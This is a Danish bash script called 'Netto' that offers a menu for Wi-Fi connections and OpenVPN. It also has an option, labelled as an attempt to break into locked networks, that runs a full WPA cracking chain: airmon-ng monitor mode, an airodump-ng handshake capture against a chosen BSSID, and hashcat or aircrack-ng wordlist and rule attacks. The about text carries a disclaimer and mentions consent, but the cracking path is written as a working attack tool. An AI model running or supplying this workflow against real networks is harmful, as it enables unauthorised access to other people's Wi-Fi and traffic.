#!/usr/bin/env bash

###
### SKRIPTET MANGLER MULIGHED FOR AT GEMME OPSÆTNING I KONFIGURATIONSFIL FOR AT GÅ I BETA
###

scan="nmcli -f IN-USE,SSID,FREQ,BARS,SIGNAL,SECURITY,ACTIVE,CHAN dev wifi"
ssid=''
wpa=''
autocon=''
conname=''
mon=''
iwconfig=''
ok=''
opt=''
dictpath=''
bssidtocrack=''
bssid=''
hndtryk=''
crackbssid=''
phy_line=$(mktemp)
wifi_dev=$(mktemp)
mondevice=$(mktemp)
ovpnindh=$(mktemp)
vpnmenuselect=$(mktemp)
dev=''
dict=''
dictpath=''
mondev=''
rule=''
valg=''
os="# NETTO - version 0.32a"

	############################################################
	######################## Funktioner ########################
	############################################################


	#################### STARTER MONITORERING ###################
	###########  A N O R M A L E  F U N K T I O N E R ###########	
crack(){
	echo "CRACKING AF NETVÆRK KRÆVER IKKE KUN PERSONLIGE TILLADELSER."
	mon="sudo -s airmon-ng"
	$mon  > ${phy_line}
	while read line; do
		for searchdev in $line; do
			if [[ $searchdev = *"wlp"* ]] || [[ $searchdev = *"wlan"* ]];then
				echo "DIT UDSTYR ER:" $searchdev
				dev=$searchdev
				break
			fi
		done
	done<${phy_line}
	rm $phy_line
	rm $wifi_dev
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####      S T O P P E R  N E T W O R K M A N A G E R  I  S Y S T E M C T L     #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	killnm="sudo systemctl stop NetworkManager"
	$killnm
	clear
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "##### A I R C R A C K - N G  T J E K K E R  O G  D R Æ B E R  P R O C E S S E R #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	monkill="sudo airmon-ng check kill"
	$monkil
	clear
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####     A I R C R A C K - N G  S T A R T E R  M O N I T O R E R I N G      #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	monstart="sudo airmon-ng start $dev"
	$monstart
	clear
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####      F I N D E R  U D S T Y R E T  T I L  M O N I T O R E R I N G      #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	ifconfig="ifconfig"
	$ifconfig > ${mondevice}
	while read line; do
		for searchmon in $line; do
			if [[ $searchmon = ${dev+*"mon"*} ]]; then
				echo "DIT MONITORERINGSUDSTYR ER:" ${searchmon//:}
				mondev=${searchmon//:}
				break
			fi
		done
	done<${mondevice}
	crackshake
}	

	##################### FIND PIBE OG GIV HÅNDTRYK ####################
crackshake(){
	getbssid="sudo airodump-ng $mondev"
	clear
	echo "(1/2) SKRIPTET STARTER NU AIRODUMP-NG. DER GENERERES EN LIST AF TILGÆNGELIGE NETVÆRK.   "
	echo "      NÅR DET ØNSKEDE NETVÆRKS BSSID (MAC-ADRESSE) ER FUNDET, TRYKKES q-TASTEN TO GANGE."
	echo "                                                                                        "
	echo "                                                                                        "
	echo "      (!) Når dette tegn vises skal du være ekstra opmærksom. Dette skyldes skriptets   "
	echo "          alpha-tilstand. Vær opmærksom på at, hvis du sendes tilbage hertil er der     "
	echo "          noget, der usædvanligt utilstrækkeligt ved din indtastning.                   "
	echo "                                                                                        "
	echo "                                                                                        "
	read -p "   ENTER/RETURN for at fortsætte...                                                  "
	$getbssid
	echo ""
	read -p "(!) BSSID: " bssid
	read -p "(!) KANAL: " kanal 
	read -p "HÅNDTRYKKETS KALDENAVN (uden filtype og mellemrum): " hndtryk
	if [ -z $bssid ]; then
		fejla="(!)Feltet BSSID kan ikke være tomt"
		crackshake
	elif [ -z $kanal ]; then
		fejlb="(!) Feltet KANAL kan ikke være tomt"
		crackshake
	elif [ -z $hndtryk ]; then
		fejlc="(!) Feltet HÆNDTRYKKETS KALDENAVN kan ikke være tomt"
		crackshake
	elif [[ "$hndtryk" = *"netto"* ]]; then
		fejld="(!) AF PRAKTISKE GRUNDE BEDES DU VÆLGE ET ANDET NAVN."
		crackshake
	fi
	bssidtocrack="sudo airodump-ng -c $kanal --bssid $bssid -w $hndtryk wlp4s0mon --ignore-negative-one"
	$bssidtocrack
	crackmeth
}

	####################        CRACK SLANGS         ##################
crackmeth(){
	clear
	echo "(2/2) AIRODUMP-NG OVERVÅGER NU FORBINDELSEN OG FORSØGE AT OPFANGE ET HÅNDTRYK.     "
        echo "      ET HÅNDTRYK KAN GENERERES NÅR ET APPARAT FORSØGER AT OPRETTE FORBINDELSE TIL "
	echo "      NETVÆRKET. HVIS DU BLIVER TRÆT AF AT VENTE, KAN DU FORSØGE AT GENNEMTVINGE ET"
	echo "      HÅNDTRYK, VED SELV AT FORSØGE AT OPRETTE FORBINDELSE TIL NETVÆRKET.          "
	echo "      HVIS DER GENERERES ET HÅNDTRYK, VISES DETTE I ØVERSTE HØJRE HJØRNE.          "
	echo "                                                                                   "
	echo "      TRYK TO GANGE PÅ q-TASTEN NÅR ET HÅNDTRYK MELDES FUNDET.                     "
	echo "                                                                                   "
	echo "      (!) HVILKEN METODE VIL DU BRUGE TIL AT CRACKE FORBINDELSEN NÅR HÅNDTRYKKET ER"
	echo "          GENERERET?                                                               "
	echo "                                                                                   "
	echo "          <h1> HASHCAT CRACKING MED ORDBOG, MEN UDEN REGELSÆT (HURTIG)             "
	echo "               Denne metode anbefales ved brug af god WPA-ordbog.                  "
	echo "                                                                                   "
	echo "          <h2> HASHCAT CRACKING MED ORDBOG MED REGELSÆT (MULIGVIS MEGET LANGSOM)   "
	echo "               Denne metode anbefales ikke til brug af WPA cracking. Men hvis du   "
	echo "               ved hvad du laver og har visse info om sikkerhedskoden kan denne    "
	echo "               metode være nyttig. Opsætning af ordbog og regel er muligvis        " 
	echo "               nødvendig.                                                          "
	echo "                                                                                   "
	echo "          <ac> AIRCRACK CRACKING MED ORDBOG; MEN UDEN REGELSÆT (LANGSOM)           "
	echo "               Denne metode langsommere end h1, men kan være nyttig, hvis Hashcat  "
	echo "               ikke er installeret (af en eller anden mystisk årsag).              "
	echo ""
	read -p "KOMMANDO (fx. xx) " ab
	maccrack
}

maccrack(){
	if [ "$ab" == "h2" ]; then
		meth="h2"
		crackdict
		elif [ "$ab" == "h1" ]; then
			meth="h1"
			crackdict
		elif [ "$ab" == "ac" ]; then
			meth="ac"
			crackdict
	else	
		crackmeth
	fi
}

	#################### VÆLG ORDBOG ######################
	# ${PWD}/dict = /nuværende_mappe/dict
crackdict(){	
	clear
	echo "VÆLG EN AF DINE ORDBØGER:"
	echo ""
	listdicts="ls -f ${HOME}/dicts"
	$listdicts
	echo ""
	read -p "(!) SKRIV ORDBOGENS FILNAVN (${HOME}/dicts/) " dictfile
	dictpath="${HOME}/dicts/${dictfile}"
	if [[ -f "$dictpath" ]]; then
		paybill
	else
		crackdict
	fi
}

	########## SLÅ INTERNET TIL IGEN ################
paybill(){
	rm $mondevice
	clear
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####                 S T O P P E R  M O N I T O R E R I N G                 #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	echo "> STOPPES PÅ $mondev"
	monstop="sudo airmon-ng stop $mondev"
	$monstop
	clear
	echo ""
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####               N E T W O R K M A N A G E R  S T A R T E S               #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	runnm="sudo /usr/bin/NetworkManager"
	$runnm
	clear
	echo ""
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####  N E T W O R K M A N A G E R  A K T I V E R E S  I  S Y S T E M C T L  #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	startnm="sudo systemctl enable NetworkManager"
	$startnm
	clear
	if [ "$meth" = "h1" ]; then
		hcnorule
	elif [ "$meth" = "h2" ]; then
		hcrule
	elif [ "$meth" = "ac" ]; then
		aircrack
	fi
}

	#################### CRACK MED HASHCAT ###################
hcrule(){
	clear
	echo "VÆLG EN AF DINE REGEL LISTER (*.rule):"
	echo ""
	lsrules="ls -f ${HOME}/rules"
	$lsrules
	echo ""
	read -p "INDTAST REGELSÆTTETS FILNAVN (${HOME}/rules/) " rulefile
	rule="${HOME}/rules/${rulefile}" 
	if [[ -f "$rule" ]]; then
		rulecrack
	else
		hcrule
	fi
}

rulecrack(){
	wpaclean="wpaclean ${hndtryk}.cap ${hndtryk}-01.cap"
	$wpaclean
	hashconvert="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
	$hashconvert
	hccrack="sudo hashcat -m 2500 -r $rule ${hndtryk}.hccapx $dictpath -D 1,2 --force"
	$hccrack
	cleanfiles="rm ${hndtryk}*.*"
	echo ""
	echo "(!) VÆR OPMÆRKSOM PÅ HVILKE FILER DU SLETTER"
	echo ""
	$cleanfiles
	read -p "ENTER/RETUR FOR MENU "
	menu
}

hcnorule(){
	clear
	wpaclean="wpaclean ${hndtryk}.cap ${hndtryk}-01.cap"
	$wpaclean
	hashconvert="sudo aircrack-ng -j $hndtryk ${hndtryk}.cap"
	$hashconvert
	hccrack="sudo hashcat -m 2500 -a 0 ${hndtryk}.hccapx $dictpath -D 1,2 --force"
	$hccrack
	cleanfiles="rm ${hndtryk}*.*"
	echo ""
	echo "(!) VÆR OPMÆRKSOM PÅ HVILKE FILER DU SLETTER"
	echo ""
	$cleanfiles
	read -p "ENTER/RETUR FOR MENU "
	menu
}

	#################### CRACK MED AIRCRACK-NG #################
aircrack(){
	clear
	crackbssid="sudo aircrack-ng -w $dictpath -b $bssid ${hndtryk}-01.cap"
	$crackbssid
	cleanfiles="rm ${hndtryk}*.*"
	echo ""
	echo "(!) VÆRD OPMÆRKSOM PÅ HVILKE FILER DU SLETTER"
	echo ""
	$cleanfiles
	read -p "ENTER/RETUR FOR MENU "
	menu
}

	     ################################################
	################### NORMALE NETVÆRKSFUNKTIONER ############
udkig(){
	clear
	echo $os
	echo ""
	$scan
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	menu
       	
}
opstartsforb(){
	clear
	echo $os
	echo""
	$scan 
	read -p "SSID " ssid
	read -p "ADGANGSKODE " wpa
	read -p "KALDENAVN " conname
	firstcon="nmcli d wifi c $ssid password $wpa"
	$firstcon
	newwifi="nmcli c add type wifi ssid $ssid connection.autoconnect yes con-name $conname"
	$newwifi
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	menu
}
midlforb(){
	clear
	echo $os
	echo ""
	$scan 
	read -p "SSID " ssid
	read -p "ADGANGSKODE " wpa
	firstcon="nmcli d wifi c $ssid password $wpa"
	$firstcon
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	menu
}
	# Mangler mulighed for at oprette passwordtxt
 # Mangler funktion der tjekker om der er forbindelse til internettet.

openvpn(){
	clear
	echo $os
	echo ""
	echo "VÆLG TEKSTFILEN INDEHOLDENDE BRUGERNAVN OG ADGANGSKODE:"
	echo""
	cmdvpnkey="ls -f /etc/openvpn/*.txt"
	$cmdvpnkey
	echo ""
	read -p "SKRIV FILENS NAVN " pass
	passpath="/etc/openvpn/${pass}"
	echo $passpath
	if [[ -f "$passpath" ]]; then
		vpnstart
	else
		openvpn
	fi
}
vpnstart(){
	clear
	echo $os
	echo ""
	echo "VÆLG EN AF DINE OPENVPN KONFIGURATIONSFILER (*.ovpn ELLER *.conf):"
	echo ""
	count=0
	cmdovpn="ls -f /etc/openvpn/*.ovpn"
	cmdconf="ls -f /etc/openvpn/*.conf"
		# Skriver output med indhold til tempfil
		$cmdovpn>${ovpnindh}
		$cmdconf>>${ovpnindh}
	# Skanner indholdet af tempfil og laver ny med 1=*,2=*...
	while read index;
		do
		for ovpnfiler in $index; do
			((count++))
			echo "<${count}>${ovpnfiler}" >> ${vpnmenuselect}
		done
	done<${ovpnindh}
	# Opstiller menuen
	(cat $vpnmenuselect)
	echo ""
	echo "(!) NÅR FORBINDELSEN ER OPRETTET AFBRYDES FORBINDELSEN VED AT TRYKKE CTRL-C"
	echo ""
	read -p "SKRIV NUMMERET FØR STIGEN TIL FILEN " vpnvalg
	# Skanner den nye tempfil for brugerens input
	while read line;
	do
		for valg in $line
		do
			if [[ "${valg}" = "<${vpnvalg}>"* ]]; then
				# Info starter efter lighedstegnet				
			       	valgtvpn=${valg#*>}
		fi
		done
	done<${vpnmenuselect}
	# Gør kommandoen til start af vpn forbindelse klar
	echo ""
	echo "DER KRÆVES SUPERBRUGER TILLADELSE"
	echo ""
	(cd /etc/openvpn)
	runvpn="sudo openvpn --config $valgtvpn --auth-user-pass $passpath --setenv PATH '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' --script-security 2 --up /etc/openvpn/scripts/update-systemd-resolved --down /etc/openvpn/scripts/update-systemd-resolved --down-pre"
	# Starter vpn forbindelse
	rm $ovpnindh
	rm $vpnmenuselect
	echo "> SØRGER FOR AT DER IKKE KØRER NOGLE OPENVPN PROCESSER"
	(sudo killall openvpn)
	echo ""
	echo "#####MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#####"
	echo "#####  F O R S Ø G E R  A T  S T A R T E  V P N - F O B I N D E L S E  #####"
	echo "^^WWWWWWWWWWWWWWVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVWWWWWWWWWWWWWW^^"
	echo ""
	$runvpn
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	count=0
	menu
}
fjernforb(){
	clear
	echo $os
	echo ""
	curconf="nmcli -p -m multiline -f NAME,AUTOCONNECT,AUTOCONNECT-PRIORITY c s" 
	$curconf
	read -p "NAVNET PÅ FORBINDELSEN TIL FJERNELSE " conname
	delwifi="nmcli c delete $conname"
	$delwifi
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	menu
}
viskonf(){
	clear
	echo $os
	echo ""
	curconf="nmcli -p -m multiline -f NAME,AUTOCONNECT,AUTOCONNECT-PRIORITY c s"
	$curconf
	echo ""
	read -p "ENTER/RETUR FOR MENU "
	menu
}
om(){
	clear
	echo "$os"
	cat | less <<-TEKST
	<> INFO OG OG BETINGELSER FOR BRUG
	
	  ~ GENEREL INFO OG BETINGELSER FOR BRUG
	
	  (!) Dette tegn betyder at du skal være særlig opmærksom på at
	      fodre skriptet med den korrekte info. Hvis den korrekte
	      info ikke gives, kan det have konsekvenser for skriptets
	      funktionalitet. DETTE SKRIPT ER STADIG I ALPHA TILSTAND
	      og derfor ikke helt færdigskrevet.
	
	 ~ OM NETTO OG BETINGELSER FOR BRUG
	
	    Netto er et bash-skript skrevet i sommeren 2020 i forbindelse
	    med en Arch Linux installation. Formålet er at give migselv
	    (tak skal du have) adgang til internettet. Skulle du af den
	    ene, eller den anden årsag være kommet i besiddelse af skriptet,
	    er al brug på eget ansvar. Jeg kan ikke stilles til regnskab for
	    din brug af dette skript. Jeg fralægger mig alt ansvar for skade
	    eller krænkelse som skriptet måtte forvolde dit eller andres
	    computersystem, netværk eller privatliv. Dette skript indeholder
	    open source software der er tiltænkt til sikkerhedsvurdering af
	    netværk. Du bør altid sikre samtykke før disse software benyttes
	    på fremmede netværk.
	
	<> INSTALLATION
	
	    (!) ALPHA: DER ER STADIG MEGET AT GØRE.
	
	  ~ VEDRØRENDE GENERELLE NETVÆRKSFORBINDELSER
	
	   - PAKKER OG OPSÆTNING
	     NØDVENDIGE FOR BASALE NETVÆRKSFUNKTIONER
	
	   1. networkmanager ( nmcli )
	
	   2. openvpn
	   3. openresolv
	   4. openvpn-update-systemd-openresolv
	       Du har også brug for /etc/openvpn/client/client.conf
	       Indeholdende:
	 ______                                              _____
	|1|	client                                              |
	|2|	remote example.com 1194 udp                         |
	|3|	..
	|4|	script-security 2
	|5|	setenv PATH /usr/bin
	|6|	up /etc/openvpn/scripts/update-systemd-resolved
	|7|	down /etc/openvpn/scripts/update-systemd-resolved
	|8|	down-pre
	|9|	dhcp-option DOMAIN-ROUTE
	|_|___                        __            _____
	
	       OPENVPN KONF.-FILER (*.ovpn ELLER *.conf) PLACERES I:
	          /etc/openvpn/
	
	       DET SAMME GÆLDER *.txt INDEHOLDENDE BRUGER OG ADGANGSKODE:
	                                                ______________________
	       Følgende format understøttes af OpenVPN:|1|oIJOBRiuGERsF7NAVN0   
	       E   K   S   E   M   P   E   L           |2|djoiADGJA97NGasKodE   |
	                                               |_|       _____        __|
	       Første linie er bruger og anden linie er adgangskoden . . .
	
	  - PAKKER OG OPSÆTNING
	    NØDVENDIGE FOR NETVÆRKSFUNTIONER VEDR. LÅSTE FORBINDELSER
	
	  ~ NØDVENDIGE PAKKER:
	    5. aircrack-ng og/eller hashcat
	    6. <AIRCRACK/HASHCAT> ifconfig
	    7. <AIRCRACK/HASHCAT> usbutils: lsusb
	    8. <HASHCAT> intel-compute-runtime (OpenCL driver)
	       non-intel systemer bruger: AMD opencl driver, NVIDIA opencl driver
	    9. <HASHCAT> opencl-headers
	
	    REGELLISTER I MAPPEN: /home/*BRUGER*/rules/
	    ORDBØGER I MAPPEN: /home/*BRUGER*/dicts/
	
	TEKST
	read -p "ENTER/RETUR FOR MENU "
}

menu(){
while :
	do
	clear
	echo $os
	echo ""
	echo "<f> ........... VIS FORBINDELSER"
	echo "<ac>........... OPRET AUTOMATISK NETVÆRKSFORBINDELSE"
	echo "<c> ........... FORBIND TIL NETVÆRKSFORBINDELSE"
	echo "<vpn> ......... FORBIND VIA OPENVPN KONFIGURATION"
	echo "<d> ........... SLET KONFIGURERET NETVÆRKSFORBINDELSE"
	echo "<log> ......... VIS KONFIGUREREDE NETVÆRSKFORBINDELSER"
	echo "<niettrekvarte> FORSØG AT BRYDE LÅST NETVÆRKSFORBINDELSE"
	echo "<q> ........... AFSLUT"
	echo ""
	echo "<about> ... (!) OM SKRIPTET, LÆS FØR BRUG"
	echo ""
	if [ ! -z "$menuflag" ]; then
		echo ""
		echo "(!)"
		echo $menuflag
		echo ""
	fi
	read -p "KOMMANDO " opt	
		case $opt in
		[f] | [F]) 
			udkig
			clear
			echo $os
			echo ""
			;;
		"ac" | "AC" | "Ac")
			opstartsforb
			clear
	 		echo $os
			echo ""
			;;
		[c] | [C])
			midlforb
			clear
			echo $os
			echo ""
			;;
		"vpn" | "Vpn" | "VPN")
			openvpn
			clear
			echo $os
			echo ""
			;;
		[d] | [D])
			fjernforb
			clear
			echo $os
			echo ""
			;;
		"log" | "LOG" | "Log")
			viskonf
			clear
			echo $os
			echo ""
			;;
		"about" | "ABOUT" | "About")
			om
			clear
			echo $os
			echo ""
			;;
		"niettrekvarte" | "NIETTREKVARTE" | "Niettrekvarte")
			crack
			clear
			echo $os
			echo ""
			;;
		[q] | [Q])
			clear
			exit 0
			;;
		*)
			menuflag="KOMMANDOEN BLEV IKKE GENKENDT. Indtast indholdet mellem <*> uden tegnene <>. I sÆrlIgE tilfælde skelnes mellem store og små bogstaver."
			clear
			echo $os
			echo ""
		esac
	done
	
}

	######################################
	#####   PROGRAMMER STARTER HER   #####
	################# MENU ###############
menu
exit
